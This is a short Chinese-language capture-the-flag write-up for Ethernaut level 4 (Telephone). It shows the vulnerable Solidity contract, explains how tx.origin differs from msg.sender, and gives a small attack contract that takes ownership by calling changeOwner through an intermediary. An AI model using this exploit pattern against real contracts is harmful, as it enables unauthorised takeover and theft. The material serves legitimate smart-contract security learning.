---
title: ethernaut NO.4
tags: TeXt
---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

```

**主要考察对tx.orgin和msg.sender的区别的理解**

tx.orgin表示交易发起的外部账户地址。更具体地说，它表示的是最初创建整个交易序列的外部账户，而不是调用当前函数的账户；

msg.sender表示调用合约的账户；

**例如：Alice调用A合约执行B合约；对于B合约来说，msg.sender=A合约，而tx.orgin为Alice**

```solidity
contract Hack{
    constructor(address _target){
        Telephone(_target).changeOwner(msg.sender);
    }
}
```

这个为攻击合约，首先传入原合约的地址，然后利用Hack合约调用Telephone合约中的changeowner函数并将msg.sender（也就是我们）的地址作为参数传入changeowner中，对于原合约，我们就是tx.origin，而msg.sender为Hack函数



